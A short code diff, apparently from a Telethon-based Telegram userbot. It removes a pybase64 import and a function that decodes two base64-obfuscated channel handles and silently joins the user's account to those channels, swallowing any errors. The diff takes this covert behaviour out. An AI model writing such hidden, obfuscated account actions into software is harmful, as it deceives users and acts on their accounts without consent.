@@ -1,4 +1,4 @@
-import pybase64
+
 from telethon.tl.functions.channels import JoinChannelRequest as Get
 from telethon.tl.types import MessageEntityMentionName
 
@@ -70,15 +70,3 @@ async def get_user_from_event(
         await edit_delete(kyyevent, "__Couldn't fetch user to proceed further__")
     return None, None
 
-
-async def checking():
-    gocheck = str(pybase64.b64decode("QE5hc3R5UHJvamVjdA=="))[2:17]
-    checker = str(pybase64.b64decode("QE5hc3R5U3VwcG9ydHQ="))[2:17]
-    try:
-        await bot(Get(gocheck))
-    except BaseException:
-        pass
-    try:
-        await bot(Get(checker))
-    except BaseException:
-        pass
